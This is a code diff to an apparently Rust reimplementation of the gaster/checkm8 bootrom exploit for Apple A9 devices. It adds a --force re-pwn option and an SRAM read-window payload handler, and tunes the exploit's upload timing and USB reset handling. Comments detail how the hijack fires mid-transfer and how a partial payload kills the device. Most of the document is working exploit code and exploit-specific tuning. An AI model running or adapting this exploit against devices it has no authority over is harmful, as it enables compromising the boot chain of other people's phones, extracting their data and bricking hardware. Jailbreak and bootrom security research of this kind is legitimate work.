@@ -34,9 +34,12 @@ use crate::config::{all_configs, config_for_identity, PayloadKind, SocConfig};
 use crate::payload::{self, BuiltPayload, OVERWRITE_STRUCT_SIZE};
 use crate::trace::{kind, Tracer};
 use crate::types::{
-    DriverClass, ResetCapability, ResetEvidence, RunOutcome, Stage, XferResult, XferStatus,
+    DeviceIdentity, DriverClass, ResetCapability, ResetEvidence, RunOutcome, Stage, XferResult,
+    XferStatus,
 };
-use crate::usb::{CtrlReq, ResetReport, Transport};
+use crate::usb::{
+    reset_error_is_device_absent, CtrlReq, ResetCall, ResetReport, Transport,
+};
 use crate::{
     DFU_CLRSTATUS, DFU_DNLOAD, DFU_FILE_SUFFIX_LEN, DFU_GETSTATUS, DFU_MAX_TRANSFER_SZ,
     DFU_STATE_MANIFEST, DFU_STATE_MANIFEST_SYNC, DFU_STATE_MANIFEST_WAIT_RESET, DFU_STATUS_OK,
@@ -264,6 +267,22 @@ pub struct RunOptions {
     pub stage_filter: Option<Stage>,
     pub setup_budget: SetupBudget,
     pub stop_after_setup_stall: bool,
+    /// **Run the exploit even when the serial descriptor already carries the
+    /// `PWND:[checkm8]` marker.**
+    ///
+    /// Without it, the round loop and `one_stage_core` treat a present marker as
+    /// "the payload is already resident" and return [`RunOutcome::Pwned`] having
+    /// transmitted **nothing** (`transfers=0`). That is rule 14's injury
+    /// (`RUNG2-EVIDENCE.md` §6.0p): the marker is a value read at *some* prior
+    /// enumeration, and a verdict built on it says the exploit ran when the
+    /// counters say it did not. With `--force` the marker is *seen and reported*
+    /// but does not short-circuit the write path.
+    ///
+    /// **Why this is needed, verbatim.** `transfers=0` on a skipped re-pwn is rule
+    /// 14's injury; the buffer-read sequence requires re-pwning **while an image is
+    /// held in the DFU buffer**, and a Power+Home (the only other way to clear the
+    /// marker) destroys that image.
+    pub force: bool,
     /// **DIAGNOSTIC DEVIATION — not part of gaster's sequence, and off by
     /// default so the shipped exploit path stays byte-identical to the
     /// reference.** When set, `stage_setup` issues one `DFU_GET_STATUS` between
@@ -286,6 +305,23 @@ pub struct RunOptions {
     /// here", not as a better exploit attempt.
     pub probe_setup_state: bool,
     pub settle_ms: u32,
+    /// Which resident handler a PATCH install places (`payload::HandlerVariant`).
+    ///
+    /// **`Stock` is the default and reproduces gaster byte for byte.** `ReadWindow` installs the
+    /// in-tree handler that adds the `0xA1/0x1F` mailbox-free SRAM read (`readwindow`), which is
+    /// the only request that can read the DFU buffer after an image has been staged into it. The
+    /// handler is longer, so `payload_dest` moves from `0x1800E0F08` to `0x1800E0EA0`; both
+    /// variants' digests are pinned separately. See `a9boot/HANDLER-RELOCATION.md`.
+    pub handler: payload::HandlerVariant,
+    /// Install the handler with its command MAILBOX at the S1 relocated base
+    /// (`config::S1_MAILBOX_BASE` = receive base + `S1_APPEND_L`) instead of
+    /// gaster's receive base — review/06 §7 S1's base+L append-relocation, the
+    /// geometry `a9boot-host`'s `boot --via point-a` requires (its
+    /// `BOOT_WINDOW_COLLISION` check refuses the colliding one). The one-shot
+    /// callback keeps the receive base regardless: the split is in
+    /// `payload::build_payload_variant`'s `mailbox` argument. Default = gaster
+    /// parity, so every measured baseline is byte-identical.
+    pub mailbox_relocated: bool,
 }
 
 impl Default for RunOptions {
@@ -303,8 +339,11 @@ impl Default for RunOptions {
             stage_filter: None,
             setup_budget: SetupBudget::default(),
             stop_after_setup_stall: false,
+            force: false,
             probe_setup_state: false,
+            mailbox_relocated: false,
             settle_ms: 0,
+            handler: payload::HandlerVariant::Stock,
         }
     }
 }
@@ -530,6 +569,17 @@ fn req_no_data(io: &mut StageIo, bm: u8, b: u8, value: u16, index: u16, len: u16
 
 /// A real data-bearing control transfer, `gaster`'s `send_usb_control_request`
 /// with a payload (gaster.c:226-240).
+///
+/// **The payload chunk is DELIBERATELY abandoned fast — do not "fix" this.** The
+/// `0 of N acked` seen on chunk 0 is not a lost upload: it is **the checkm8
+/// hijack firing during that very transfer**. The moment the overflow's callback
+/// fires the CPU jumps into the payload and the ROM's DFU loop is gone, so the
+/// control transfer's status stage never completes; the host must abandon it
+/// QUICKLY and carry on (gaster's chunk loop "cannot fail" for exactly this
+/// reason). MEASURED 2026-10-04, twice on a clean prober-free host: widening this
+/// window to 1000 ms made every pwn afterwards LOSE the device from the bus —
+/// the host held the transfer open for a full second while the payload ran its
+/// MMU/ttbr0 patches. The short window is part of the exploit's timing.
 fn req_out(io: &mut StageIo, r: CtrlReq, data: &[u8]) -> XferResult {
     let timeout = io.opts.timeout_ms();
     io.usb.control_out(r, data, timeout)
@@ -1723,6 +1773,21 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
     // `attempted` is every byte gaster's loop would put on the wire; `acked` is
     // what the device acknowledged in full. They are reported separately because
     // the difference is what the PWND check after the reset is up against.
+    //
+    // **THE PATCH-UPLOAD TIMEOUT (2026-10-04, measured-consequence fix).** These
+    // chunks used the SETUP sweep's 5 ms window (`opts.timeout_ms`, gaster's
+    // `USB_TIMEOUT`) — right for the sweep's abort windows, wrong for a payload
+    // transfer on a busy bus. Every pwn on the 2026-10-04 Linux session reported
+    // `PATCH_UPLOAD_SHORT: 0 of N acked`, and one of them left a PARTIAL payload
+    // at 0x180380000 — which the post-PATCH reset then EXECUTED (the overwrite's
+    // callback points there), killing the device outright. The count is doubly
+    // unreliable (my fix-2: `transferred` is fabricated on failure), so the only
+    // defensible position is to make the FIRST send patient enough to be real:
+    // one transfer, `PATCH_UPLOAD_TIMEOUT_MS`, never a retry (a second DNLOAD
+    // would APPEND to a buffer whose receive position is unknown — the rawdfu
+    // warning). If a chunk is STILL short after that, the run must treat the
+    // device as armed-dangerous: the reset that follows will execute whatever
+    // landed at 0x180380000, so the warning says POWER-CYCLE, do not trust it.
     let mut attempted = 0usize;
     let mut acked = 0usize;
     let mut short_chunks = 0u64;
@@ -1766,8 +1831,12 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
             short_chunks += 1;
             let detail = format!(
                 "payload chunk {i} ({} bytes at offset {attempted}) returned {} with {} bytes \
-                 sent. PATCH_UPLOAD_SHORT: the payload in the bootrom may be incomplete, and the \
-                 PWND marker after the reset is the only proof either way.",
+                 sent. This is USUALLY the checkm8 hijack firing DURING the transfer (the CPU has \
+                 jumped into the payload and the ROM's DFU loop is gone, so the status stage never \
+                 completes — see the `req_out` doc; gaster's loop continues for this reason). It \
+                 can also be a genuinely dead chunk: the PWND marker after the reset decides, and \
+                 if the device vanishes instead, power-cycle it rather than trusting its state \
+                 (2026-10-04).",
                 chunk.len(),
                 r.status,
                 r.transferred
@@ -1815,6 +1884,20 @@ pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
             patch_upload_summary(attempted, acked, short_chunks, &built.blob_sha256, state_ok)
         ),
     );
+    // **On stdout, unconditionally.** The digest of the buffer that went on the wire is the one
+    // datum that says *which handler was installed*, and it was reachable only with `--trace` or
+    // `--verbose` — a `[PWNED]` marker cannot distinguish a stock install from a read-window one,
+    // which is exactly the ambiguity this line removes. `RUNG2-EVIDENCE.md` §6.0p rule 14: report
+    // the counters, so the claim comes with its evidence.
+    println!(
+        "  PATCH blob   : handler={} {} bytes, {} of {} acked, {} short chunk(s), sha256 {}",
+        built.handler.name(),
+        built.blob.len(),
+        acked,
+        attempted,
+        short_chunks,
+        built.blob_sha256
+    );
     if !state_ok {
         println!(
             "  PATCH: warning - the MANIFEST state walk after the upload did not complete \
@@ -1861,6 +1944,19 @@ fn dispatch(io: &mut StageIo, stage: Stage, built: &BuiltPayload) -> StageResult
         Stage::Patch => stage_patch(io, built),
         Stage::Pwned => StageResult::Pass,
     }
+}
+
+/// The marker short-circuit, isolated so the `--force` bypass is one testable
+/// predicate instead of a condition duplicated at two call sites.
+///
+/// A present marker means the exploit landed at some **earlier** point — it is a
+/// value written into `gUSBSerialNumber` by a previous pwn (`gaster.c:811`), not a
+/// measurement of this invocation. Without `--force` the reference's behaviour is
+/// followed: report the goal state and skip the write path. With `--force` the
+/// write path runs anyway; see [`RunOptions::force`] for why the DFU-buffer re-pwn
+/// needs exactly that and why re-entering DFU is not an alternative.
+fn skip_on_marker(opts: &RunOptions, id: &DeviceIdentity) -> bool {
+    id.is_pwned() && !opts.force
 }
 
 /// Run the exploit. `INTERFACE.md` §4.
@@ -1978,14 +2074,29 @@ fn run_rounds(opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
         };
 
         let id = usb.identity();
-        if id.is_pwned() {
+        // Rule 14 (`RUNG2-EVIDENCE.md` §6.0p): the marker is a state measurement,
+        // not proof this invocation ran the exploit. `--force` is the only way past
+        // this short-circuit; without it a marked device produces `transfers=0` and
+        // the verdict must refuse `[PWNED]` (verdict.rs `PWNED_UNMEASURED`).
+        if skip_on_marker(opts, &id) {
             tracer.event(
                 "pwned",
                 Some(Stage::Pwned),
                 &format!("PWND marker present: {:?}", id.pwnd),
             );
-            println!("  PWND marker present: {:?} — checkm8 landed.", id.pwnd);
+            println!(
+                "  PWND marker present: {:?} — already pwned (this is the marker, NOT this run: \
+                 nothing has been sent).",
+                id.pwnd
+            );
             return RunOutcome::Pwned;
+        }
+        if id.is_pwned() {
+            println!(
+                "  PWND marker present: {:?} — --force given, running the exploit anyway (the \
+                 buffer-read re-pwn needs it).",
+                id.pwnd
+            );
         }
 
         if session.is_none() {
@@ -2040,7 +2151,15 @@ fn run_rounds(opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
                 ));
             }
 
-            let built = match payload::build_payload(&cfg, kind) {
+            // The S1 mailbox split (review/06 §7): `--mailbox-relocated` installs the
+            // handler with its command mailbox at `S1_MAILBOX_BASE` (base+L) so a staged
+            // image and the command channel never share a byte. Default = gaster parity.
+            let mailbox = if opts.mailbox_relocated {
+                crate::config::S1_MAILBOX_BASE
+            } else {
+                cfg.insecure_memory_base
+            };
+            let built = match payload::build_payload_variant(&cfg, kind, opts.handler, mailbox) {
                 Ok(b) => b,
                 Err(e) => return RunOutcome::Aborted(format!("payload build failed: {e}")),
             };
@@ -2082,8 +2201,21 @@ fn run_rounds(opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
             dispatch(&mut io, executed, &s.built)
         };
         let passed = result.is_pass();
+        // INSTRUMENT FIX 4 (review/07 finding 13): the RESET stage's pass CLAIM is derived from
+        // its own bus-reset predicate, which `reset_after_attempt` measures only AFTER this
+        // point — so the claim is deferred there. 139 `stage_pass` RESET events coexisted with
+        // 350 `bus_reset_delivered` FAILs and 0 PASSes; a stage PASS may not coexist with its
+        // own failed predicate. Continue semantics are untouched (`passed` below still drives
+        // the machine exactly as before).
+        let mut deferred_reset_claim = false;
         match &result {
-            StageResult::Pass => tracer.event("stage_pass", Some(executed), executed.name()),
+            StageResult::Pass => {
+                if executed == Stage::Reset {
+                    deferred_reset_claim = true;
+                } else {
+                    tracer.event("stage_pass", Some(executed), executed.name());
+                }
+            }
             StageResult::Fail(f) => {
                 tracer.event(
                     "stage_fail",
@@ -2125,10 +2257,23 @@ fn run_rounds(opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
         // evidence gate and the messages all live in `reset_after_attempt`,
         // shared with the single-stage path so the two cannot drift apart again
         // (the B1 defect was this same wrong condition written in both places).
-        if let Err(outcome) =
-            reset_after_attempt(&mut usb, tracer, opts, "post-stage", executed.name())
+        let reset_report = match reset_after_attempt(&mut usb, tracer, opts, "post-stage", executed.name())
         {
-            return outcome;
+            Err(outcome) => return outcome,
+            Ok(r) => r,
+        };
+        if deferred_reset_claim {
+            let (kind_tok, detail) = match &reset_report {
+                Some(rep) => reset_stage_event(rep.bus_reset_delivered, rep.evidence.as_str()),
+                None => (
+                    kind::STAGE_UNPROVEN,
+                    "the DFU dance passed but no bus-reset evidence exists (the reset call found \
+                     the device absent — the known post-CLR_STATUS drop): a stage_pass is not \
+                     claimable without its predicate."
+                        .to_string(),
+                ),
+            };
+            tracer.event(kind_tok, Some(Stage::Reset), &detail);
         }
 
         // gaster.c:1273 — close, then re-open at the top of the loop.
@@ -2229,9 +2374,20 @@ fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOu
         }
     };
     let id = usb.identity();
-    if id.is_pwned() {
+    if skip_on_marker(opts, &id) {
         tracer.event("pwned", Some(Stage::Pwned), "PWND marker already present");
         return RunOutcome::Pwned;
+    }
+    if id.is_pwned() {
+        tracer.event(
+            "pwned",
+            Some(Stage::Pwned),
+            "PWND marker present and --force given: running the stage anyway",
+        );
+        println!(
+            "  PWND marker present: {:?} — --force given, running the stage anyway.",
+            id.pwnd
+        );
     }
     let (cfg, kind) = match config_for_identity(&id) {
         Ok(v) => v,
@@ -2256,7 +2412,12 @@ fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOu
             cap.as_str()
         ));
     }
-    let built = match payload::build_payload(&cfg, kind) {
+    let mailbox = if opts.mailbox_relocated {
+        crate::config::S1_MAILBOX_BASE
+    } else {
+        cfg.insecure_memory_base
+    };
+    let built = match payload::build_payload_variant(&cfg, kind, opts.handler, mailbox) {
         Ok(b) => b,
         Err(e) => return RunOutcome::Aborted(format!("payload build failed: {e}")),
     };
@@ -2324,8 +2485,17 @@ fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOu
         dispatch(&mut io, stage, &built)
     };
     let code = result.fail_code().map(|c| c.to_string());
+    // INSTRUMENT FIX 4 (review/07 finding 13) — see `reset_stage_event`: the RESET stage's pass
+    // claim is deferred until its bus-reset predicate has been measured below.
+    let mut deferred_reset_claim = false;
     match &result {
-        StageResult::Pass => tracer.event("stage_pass", Some(stage), stage.name()),
+        StageResult::Pass => {
+            if stage == Stage::Reset {
+                deferred_reset_claim = true;
+            } else {
+                tracer.event("stage_pass", Some(stage), stage.name());
+            }
+        }
         StageResult::Fail(f) => tracer.event(
             "stage_fail",
             Some(stage),
@@ -2340,8 +2510,22 @@ fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOu
     // a reset refusal instead of the STALL it exists to prove
     // (`docs/VERIFICATION-live-run.md` B1.2).
     let passed = result.is_pass();
-    if let Err(e) = reset_after_attempt(&mut usb, tracer, opts, "post-stage", stage.name()) {
-        return e;
+    let reset_report = match reset_after_attempt(&mut usb, tracer, opts, "post-stage", stage.name()) {
+        Err(e) => return e,
+        Ok(r) => r,
+    };
+    if deferred_reset_claim {
+        let (kind_tok, detail) = match &reset_report {
+            Some(rep) => reset_stage_event(rep.bus_reset_delivered, rep.evidence.as_str()),
+            None => (
+                kind::STAGE_UNPROVEN,
+                "the DFU dance passed but no bus-reset evidence exists (the reset call found the \
+                 device absent — the known post-CLR_STATUS drop): a stage_pass is not claimable \
+                 without its predicate."
+                    .to_string(),
+            ),
+        };
+        tracer.event(kind_tok, Some(Stage::Reset), &detail);
     }
     if setup_stall_stop_requested(stage, passed, opts) {
         let c = tracer.counters();
@@ -2451,6 +2635,56 @@ pub fn reset_gate(evidence: ResetEvidence, allow_winusb: bool) -> ResetGate {
     }
 }
 
+/// What to do when the `libusb_reset_device` **call itself failed**. Kept apart
+/// from [`ResetGate`], which decides what a *completed* call's evidence means.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ResetDisposition {
+    /// The device was absent: the exploit's own drop. Wait for it to come back
+    /// (the round loop re-opens at the top of every iteration, bounded by
+    /// [`OPEN_RETRY_BUDGET`]) and continue the run.
+    KnownDrop,
+    /// The call was refused with the device present: stop. This is the case the
+    /// gate exists for, and it must not be weakened into "any failure".
+    Stop,
+    /// `--allow-winusb` was passed: the operator asked to reproduce a failure
+    /// mode deliberately, so the run continues — loudly, never silently.
+    StopOverridden,
+}
+
+/// The disposition for a **failed reset call**, from the libusb code alone.
+///
+/// Pure and total over `i32`, so the whole domain is pinned by a table test.
+/// Only the two "device is not there" codes continue by themselves; every other
+/// code still stops the run.
+///
+/// **The wrong fix this guards against.** MEASURED 2026-10-03: after the spray's
+/// `DFU_CLRSTATUS` (`gaster.c:910`) the device leaves the bus and comes back by
+/// itself, so the post-SPRAY reset returns `LIBUSB_ERROR_NOT_FOUND` and the run
+/// stopped before PATCH. The tempting repair is to let "the reset call failed"
+/// continue in general — which would turn the gate into one that never fires
+/// and hide a genuinely resettable-host problem. The distinction is the whole
+/// point: absent ⇒ the exploit's drop (absorbed by the reference,
+/// `gaster.c:197-200`, `:1268`, `wait_usb_handle` `:202-218`); present ⇒ a host
+/// capability problem (stop).
+pub fn reset_failure_disposition(rc: i32, allow_winusb: bool) -> ResetDisposition {
+    if reset_error_is_device_absent(rc) {
+        ResetDisposition::KnownDrop
+    } else if allow_winusb {
+        ResetDisposition::StopOverridden
+    } else {
+        ResetDisposition::Stop
+    }
+}
+
+/// The trace kind for a reset that failed because the device was absent.
+///
+/// Deliberately **not** [`kind::RESET`]: that kind counts as an attempt with no
+/// evidence, and `Counters::resets_unrecorded` feeds the `RESET_NOT_DELIVERED`
+/// verdict — so recording the exploit's own drop as a bare reset would blame the
+/// host for it. This kind is recorded verbatim and counted by nothing, which is
+/// what "its own evidence" means here.
+pub const KIND_RESET_AFTER_DROP: &str = "reset_after_drop";
+
 /// `bState` as the DFU 1.1 spec numbers it (the same labels `usb.rs:169-170`
 /// uses): 0 appIDLE, 1 appDETACH, 2 dfuIDLE, 3 dfuDNLOAD-SYNC, 4 dfuDNBUSY,
 /// 5 dfuDNLOAD-IDLE, 6 dfuMANIFEST-SYNC, 7 dfuMANIFEST, 8
@@ -2529,6 +2763,33 @@ pub fn reset_warning(when: &str, after: &str, r: &ResetReport) -> String {
     )
 }
 
+/// Which event the RESET stage may CLAIM — derived from its own bus-reset predicate
+/// (instrument fix 4; review/07 finding 13). The DFU dance and the bus reset are two separate
+/// measurements: `stage_pass` used to be claimed from the first while the second's
+/// `bus_reset_delivered` predicate FAILed 350 times and PASSED 0 across the corpus (139
+/// `stage_pass` RESET events against that). A PASS may not coexist with its own failed
+/// predicate, so an unproven reset claims `stage_unproven` instead — the run's continue
+/// semantics are unchanged, only the claim is.
+pub fn reset_stage_event(delivered: bool, evidence: &str) -> (&'static str, String) {
+    if delivered {
+        (
+            "stage_pass",
+            format!("RESET — the DFU dance passed and the bus reset DELIVERED (evidence {evidence})"),
+        )
+    } else {
+        (
+            kind::STAGE_UNPROVEN,
+            format!(
+                "the DFU dance passed but the bus reset did not prove itself \
+                 (bus_reset_delivered=FAIL, evidence {evidence}): this stage is UNPROVEN, not a \
+                 pass — a stage_pass may not coexist with its own failed predicate (review/07 \
+                 finding 13). Continuing per the reset gate; see the reset_unverified / \
+                 bus_reset_not_proven events for the reset itself."
+            ),
+        )
+    }
+}
+
 /// The abort sentence for a reset the gate refuses to continue past. Pure.
 pub fn reset_stop_message(when: &str, after: &str, r: &ResetReport, allow_winusb: bool) -> String {
     let why = match r.evidence {
@@ -2586,26 +2847,75 @@ fn reset_after_attempt(
     opts: &RunOptions,
     when: &str,
     after: &str,
-) -> Result<(), RunOutcome> {
-    let report = match usb.reset() {
-        Ok(r) => r,
-        Err(e) => {
-            // The call itself failed: a third outcome, counted as an attempt
-            // only (`trace::kind::RESET`), never as real and never as a pipe
-            // cycle. gaster ignores this and continues; we stop by default.
+) -> Result<Option<ResetReport>, RunOutcome> {
+    // `Some(report)` = the bus reset was ATTEMPTED and its evidence measured (the caller may
+    // derive the RESET stage's claim from `bus_reset_delivered` — instrument fix 4);
+    // `None` = no evidence exists (device absent / the call itself failed).
+    let report = match usb.reset_call() {
+        ResetCall::Report(r) => r,
+        ResetCall::RefusedAbsent { rc, micros, note } => {
+            // The known drop: the exploit's own DFU_CLRSTATUS took the device off
+            // the bus (gaster.c:910), and the reference absorbs it — it discards
+            // every reset result (:197-200, :1268) and `wait_usb_handle`
+            // (:202-218) loops until a handle appears again. This must never be
+            // attributed to the host's reset capability, so it is recorded under
+            // its own kind, which no counter claims, and the run continues; the
+            // next round's re-open is the bounded wall-clock wait.
+            debug_assert_eq!(
+                reset_failure_disposition(rc, opts.allow_winusb),
+                ResetDisposition::KnownDrop,
+                "RefusedAbsent must mean the device was absent"
+            );
+            tracer.event(
+                KIND_RESET_AFTER_DROP,
+                Some(Stage::Reset),
+                &format!(
+                    "when={when} after={after}: the reset call failed because the device was \
+                     ABSENT (rc={rc}, {micros} us) — the known post-CLR_STATUS drop \
+                     (gaster.c:910), which the reference absorbs (gaster.c:197-200, :1268; \
+                     wait_usb_handle :202-218). CONTINUING; the next round re-opens with a \
+                     wall-clock budget and records the absence. {note}"
+                ),
+            );
+            println!(
+                "  RESET: device absent (the known drop, rc={rc}, {micros} us) — continuing; the \
+                 next re-open waits for re-enumeration"
+            );
+            return Ok(None);
+        }
+        ResetCall::RefusedPresent { rc, micros, note } => {
+            // The call failed with the device present: a third outcome, counted
+            // as an attempt only (`trace::kind::RESET`), never as real and never
+            // as a pipe cycle. gaster ignores this and continues; we stop by
+            // default — unless the operator asked for the failure deliberately.
             tracer.event(
                 kind::RESET,
                 Some(Stage::Reset),
-                &format!("when={when} after={after}: the reset call failed: {e}"),
+                &format!(
+                    "when={when} after={after}: the reset call failed with the device present \
+                     (rc={rc}, {micros} us): {note}"
+                ),
             );
-            if !opts.allow_winusb {
-                return Err(RunOutcome::Aborted(format!(
-                    "the {when} bus reset (after the {after} attempt) failed: {e}. checkm8 needs a \
-                     real reset after every attempt (gaster.c:1268); --allow-winusb overrides only \
-                     to prove the failure."
-                )));
-            }
-            return Ok(());
+            return match reset_failure_disposition(rc, opts.allow_winusb) {
+                ResetDisposition::Stop => Err(RunOutcome::Aborted(format!(
+                    "the {when} bus reset (after the {after} attempt) was REFUSED while the \
+                     device was present: {note} checkm8 needs a real reset after every attempt \
+                     (gaster.c:1268); --allow-winusb overrides only to prove the failure."
+                ))),
+                ResetDisposition::StopOverridden => {
+                    // `--allow-winusb` is the operator asking to reproduce a
+                    // failure on purpose. The trace records it either way; the
+                    // console must not be the quiet one, or a run that only
+                    // continued because of the override looks like a clean one.
+                    println!(
+                        "  RESET: WARNING - the {when} bus reset (after the {after} attempt) was \
+                         REFUSED with the device present (rc={rc}); continuing ONLY because \
+                         --allow-winusb was passed"
+                    );
+                    Ok(None)
+                }
+                ResetDisposition::KnownDrop => unreachable!("the code above proves absence"),
+            };
         }
     };
 
@@ -2619,7 +2929,7 @@ fn reset_after_attempt(
     record_reset(tracer, when, after, &report);
 
     match reset_gate(report.evidence, opts.allow_winusb) {
-        ResetGate::Continue => Ok(()),
+        ResetGate::Continue => Ok(Some(report)),
         ResetGate::ContinueLoudly => {
             let warning = reset_warning(when, after, &report);
             tracer.event(
@@ -2628,7 +2938,7 @@ fn reset_after_attempt(
                 &format!("{warning} [{}]", report.evidence.as_str()),
             );
             println!("  RESET: WARNING - {}", one_line(&warning));
-            Ok(())
+            Ok(Some(report))
         }
         ResetGate::Stop => Err(RunOutcome::Aborted(reset_stop_message(
             when,
@@ -2644,38 +2954,101 @@ struct Session {
     built: BuiltPayload,
 }
 
-/// gaster's `wait_usb_handle` (gaster.c:202-218) loops forever, sleeping
-/// `usb_timeout` ms between attempts. A bus reset re-enumerates the device, so a
-/// single failed open right after one is expected — but an unbounded wait is how
-/// a run stops being diagnosable. Bounded, then reported.
-const OPEN_RETRY_TRIES: u32 = 600;
+/// How long to keep waiting for a re-enumerating device. **Wall clock**, not an
+/// attempt count: the drop we measure costs 435 ms (MEASURED 2026-10-03, the
+/// post-`CLR_STATUS` return, at a new address), and LINUX-HANDOFF §4.8 records
+/// that "19 open attempts" was really 285-292 ms — a count is not a duration and
+/// cannot be compared with either number. Three seconds is ~7x the measured
+/// return time and matches the bounded re-open in `main.rs`.
+pub const OPEN_RETRY_BUDGET: Duration = Duration::from_millis(3_000);
+
+/// Safety valve for a hot loop that fails *instantly* (a permissions error, say):
+/// the budget above is the real bound; this only stops a spin from becoming
+/// millions of calls to `Transport::open_first_dfu`.
+pub const OPEN_RETRY_TRIES: u32 = 10_000;
+
+/// Pure: may another open attempt be made? Split out so the **wall-clock** rule
+/// (E5-3: durations, not attempt counts) is pinned without hardware.
+pub fn open_retry_allowed(elapsed: Duration, attempts: u32) -> bool {
+    elapsed < OPEN_RETRY_BUDGET && attempts < OPEN_RETRY_TRIES
+}
+
+/// The longest a single between-attempt pause may be, however the operator
+/// configured `--usb-timeout-ms`.
+///
+/// **Why 50 ms.** A re-enumeration after the spray's `DFU_CLRSTATUS` takes
+/// ~435 ms (MEASURED 2026-10-03, and 400.8/268.0 ms in the run that pwned), so
+/// the pause has to be small enough that *several* attempts land inside
+/// [`OPEN_RETRY_BUDGET`] even in the worst case: 3 s / 50 ms = 60 attempts, an
+/// attempt every 50 ms across a 435 ms absence. `main.rs`'s own re-open loop
+/// pauses 50 ms for the same reason.
+pub const OPEN_RETRY_MAX_PAUSE: Duration = Duration::from_millis(50);
+
+/// Pure: the pause before the next open attempt — the configured interval,
+/// never longer than [`OPEN_RETRY_MAX_PAUSE`], and never past the budget.
+///
+/// **The defect this exists for** (reviewer, MEASURED 2026-10-03): the pause is
+/// `--usb-timeout-ms` (default 5 ms; `main.rs:133` validates only a lower
+/// bound). With the default the loop makes ~600 attempts inside the 3 s budget,
+/// but with `--usb-timeout-ms 5000` ONE sleep crosses the whole budget and the
+/// loop makes exactly **one** attempt — so the 435 ms re-enumeration would
+/// never be caught and a healthy device would read as absent. Clamping to the
+/// budget alone would not fix that (sleep == budget still exits after one
+/// attempt); the cap is what guarantees the budget admits many attempts.
+pub fn open_retry_pause(configured: Duration, elapsed: Duration) -> Duration {
+    configured
+        .min(OPEN_RETRY_MAX_PAUSE)
+        .min(OPEN_RETRY_BUDGET.saturating_sub(elapsed))
+}
+
+/// Pure: the line recorded when a re-enumerating device came back.
+pub fn open_retry_ok_note(attempt: u32, elapsed: Duration) -> String {
+    format!(
+        "device opened on attempt {attempt} after {:.3} ms of wall-clock absence (gaster waits \
+         forever here; this wait was bounded by {OPEN_RETRY_BUDGET:?})",
+        elapsed.as_secs_f64() * 1000.0
+    )
+}
+
+/// Pure: the line recorded when it never came back.
+pub fn open_retry_exhausted_note(elapsed: Duration, attempts: u32, last: &str) -> String {
+    format!(
+        "no DFU device after {:.0} ms of wall-clock waiting ({attempts} open attempt(s), budget \
+         {OPEN_RETRY_BUDGET:?}): {last}",
+        elapsed.as_secs_f64() * 1000.0
+    )
+}
 
 fn open_with_retry(opts: &RunOptions, tracer: &mut Tracer) -> Result<Transport, String> {
-    let pause = Duration::from_millis(opts.timeout_ms() as u64);
+    let configured = Duration::from_millis(opts.timeout_ms() as u64);
+    let started = Instant::now();
     let mut last = String::from("no attempt made");
-    for attempt in 1..=OPEN_RETRY_TRIES {
+    let mut attempts = 0u32;
+
+    while open_retry_allowed(started.elapsed(), attempts) {
+        attempts += 1;
         match Transport::open_first_dfu() {
             Ok(t) => {
-                if attempt > 1 {
+                if attempts > 1 {
                     tracer.event(
                         "open_retry_ok",
                         None,
-                        &format!("device opened on attempt {attempt} (gaster waits forever here)"),
+                        &open_retry_ok_note(attempts, started.elapsed()),
                     );
                 }
                 return Ok(t);
             }
-            Err(e) => {
-                last = e;
-                if attempt < OPEN_RETRY_TRIES {
-                    sleep(pause);
-                }
-            }
+            Err(e) => last = e,
+        }
+        if open_retry_allowed(started.elapsed(), attempts) {
+            sleep(open_retry_pause(configured, started.elapsed()));
         }
     }
-    Err(format!(
-        "no DFU device after {OPEN_RETRY_TRIES} open attempts (~{} ms): {last}",
-        OPEN_RETRY_TRIES as u64 * opts.timeout_ms() as u64
+
+    Err(open_retry_exhausted_note(
+        started.elapsed(),
+        attempts,
+        &last,
     ))
 }
 
@@ -2704,8 +3077,20 @@ fn dry_run_all(opts: &RunOptions) -> RunOutcome {
     }
     println!("  blob sha256  : both vendored blobs verified");
     let mut built_ok = 0usize;
+    println!("  handler      : {} (--handler)", opts.handler.name());
     for cfg in all_configs() {
-        match payload::build_payload(cfg, PayloadKind::A9) {
+        // Honour the selected handler: a dry run that prints the stock plan while `run` would
+        // install the read-window handler is a flag that half-works, which is its own failure.
+        match payload::build_payload_variant(
+            cfg,
+            PayloadKind::A9,
+            opts.handler,
+            if opts.mailbox_relocated {
+                crate::config::S1_MAILBOX_BASE
+            } else {
+                cfg.insecure_memory_base
+            },
+        ) {
             Ok(built) => {
                 print_plan(cfg, PayloadKind::A9, &built);
                 built_ok += 1;
@@ -2789,8 +3174,18 @@ fn dry_run_stage(stage: Stage, opts: &RunOptions) -> RunOutcome {
             println!("    cap: the run-level budget, {} iterations / {} ms (the reference is unbounded)", opts.setup_budget.max_attempts, opts.setup_budget.max_millis);
         }
         Stage::Patch => {
+            println!("    handler: {} (--handler)", opts.handler.name());
             for cfg in all_configs() {
-                match payload::build_payload(cfg, PayloadKind::A9) {
+                match payload::build_payload_variant(
+            cfg,
+            PayloadKind::A9,
+            opts.handler,
+            if opts.mailbox_relocated {
+                crate::config::S1_MAILBOX_BASE
+            } else {
+                cfg.insecure_memory_base
+            },
+        ) {
                     Ok(built) => print_plan(cfg, PayloadKind::A9, &built),
                     Err(e) => println!("  {}: BUILD FAILED: {e}", cfg.name),
                 }
@@ -3218,11 +3613,46 @@ mod tests {
         assert_eq!(o.abort_timeout_min_ms, 0, "gaster.c:1635-1637");
         assert_eq!(o.leak_windex, LEAK_WINDEX_GASTER);
         assert!(!o.dry_run && !o.verbose && !o.allow_winusb && !o.stop_after_setup_stall);
+        assert!(!o.force, "--force must be opt-in: a marked device skips the write path by default");
         assert_eq!(o.trace_path, None);
         assert_eq!(o.stage_filter, None);
         assert_eq!(o.settle_ms, 0, "0 = gaster's behaviour");
         assert_eq!(o.setup_budget.max_attempts, 20_000);
